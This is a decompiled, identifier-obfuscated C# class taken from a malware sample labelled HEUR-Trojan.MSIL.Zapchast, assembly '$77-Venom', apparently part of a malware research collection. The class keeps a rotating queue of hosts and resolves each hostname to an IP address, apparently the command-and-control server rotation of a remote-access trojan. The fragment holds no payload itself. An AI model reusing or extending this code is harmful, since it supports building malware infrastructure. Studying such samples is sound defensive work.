// Decompiled with JetBrains decompiler
// Type: ⬈㫟ఞ쵃벂⟥杖Ⴚ敺㌍掎冺ณ鎄⹌ಾ杂ⶐ晲観
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;

public class \u2B08㫟ఞ쵃벂\u27E5杖Ⴚ敺\u330D掎冺ณ鎄\u2E4Cಾ杂ⶐ晲観
{
  private readonly Queue<ࢧ얺ｋ\u326B捲\u0AFE\uE86B\uF59A\uE762䀉狯\u0F3B蟢覧\uAAD1\uFFFD畨ꃫ颪\uFFFD> 沘ꖰ\uF282\u0A0Dб隋ꋝ㵍\uFFFD놠㘅웅㥸薆\u2512弃퓒Ꜧ擬볁 = new Queue<ࢧ얺ｋ\u326B捲\u0AFE\uE86B\uF59A\uE762䀉狯\u0F3B蟢覧\uAAD1\uFFFD畨ꃫ颪\uFFFD>();

  public bool IsEmpty => this.沘ꖰ\uF282\u0A0Dб隋ꋝ㵍\uFFFD놠㘅웅㥸薆\u2512弃퓒Ꜧ擬볁.Count == 0;

  public \u2B08㫟ఞ쵃벂\u27E5杖Ⴚ敺\u330D掎冺ณ鎄\u2E4Cಾ杂ⶐ晲観(
    List<ࢧ얺ｋ\u326B捲\u0AFE\uE86B\uF59A\uE762䀉狯\u0F3B蟢覧\uAAD1\uFFFD畨ꃫ颪\uFFFD> hosts)
  {
    foreach (ࢧ얺ｋ\u326B捲\u0AFE\uE86B\uF59A\uE762䀉狯\u0F3B蟢覧\uAAD1\uFFFD畨ꃫ颪\uFFFD host in hosts)
      this.沘ꖰ\uF282\u0A0Dб隋ꋝ㵍\uFFFD놠㘅웅㥸薆\u2512弃퓒Ꜧ擬볁.Enqueue(host);
  }

  public ࢧ얺ｋ\u326B捲\u0AFE\uE86B\uF59A\uE762䀉狯\u0F3B蟢覧\uAAD1\uFFFD畨ꃫ颪\uFFFD \uECD5肳钪䙗\uE223ꂭ\uE840뼺ₔ瀷ᬘ响꾛\u3003鷍熢출\uFFFD홋룞()
  {
    ࢧ얺ｋ\u326B捲\u0AFE\uE86B\uF59A\uE762䀉狯\u0F3B蟢覧\uAAD1\uFFFD畨ꃫ颪\uFFFD host = this.沘ꖰ\uF282\u0A0Dб隋ꋝ㵍\uFFFD놠㘅웅㥸薆\u2512弃퓒Ꜧ擬볁.Dequeue();
    this.沘ꖰ\uF282\u0A0Dб隋ꋝ㵍\uFFFD놠㘅웅㥸薆\u2512弃퓒Ꜧ擬볁.Enqueue(host);
    host.IpAddress = \u2B08㫟ఞ쵃벂\u27E5杖Ⴚ敺\u330D掎冺ณ鎄\u2E4Cಾ杂ⶐ晲観.㬃漇슸䣴υ쉤侎䢟闆慄\u1CB2魘몬柵ﰔ듧뤬샹偡\uF722(host);
    return host;
  }

  private static IPAddress 㬃漇슸䣴υ쉤侎䢟闆慄\u1CB2魘몬柵ﰔ듧뤬샹偡\uF722(
    ࢧ얺ｋ\u326B捲\u0AFE\uE86B\uF59A\uE762䀉狯\u0F3B蟢覧\uAAD1\uFFFD畨ꃫ颪\uFFFD host)
  {
    if (string.IsNullOrEmpty(host.Hostname))
      return (IPAddress) null;
    IPAddress address;
    if (IPAddress.TryParse(host.Hostname, out address))
      return address.AddressFamily == AddressFamily.InterNetworkV6 && !Socket.OSSupportsIPv6 ? (IPAddress) null : address;
    IPAddress[] addressList = Dns.GetHostEntry(host.Hostname).AddressList;
    foreach (IPAddress ipAddress in addressList)
    {
      switch (ipAddress.AddressFamily)
      {
        case AddressFamily.InterNetwork:
          return ipAddress;
        case AddressFamily.InterNetworkV6:
          if (addressList.Length == 1)
            return ipAddress;
          break;
      }
    }
    return address;
  }
}
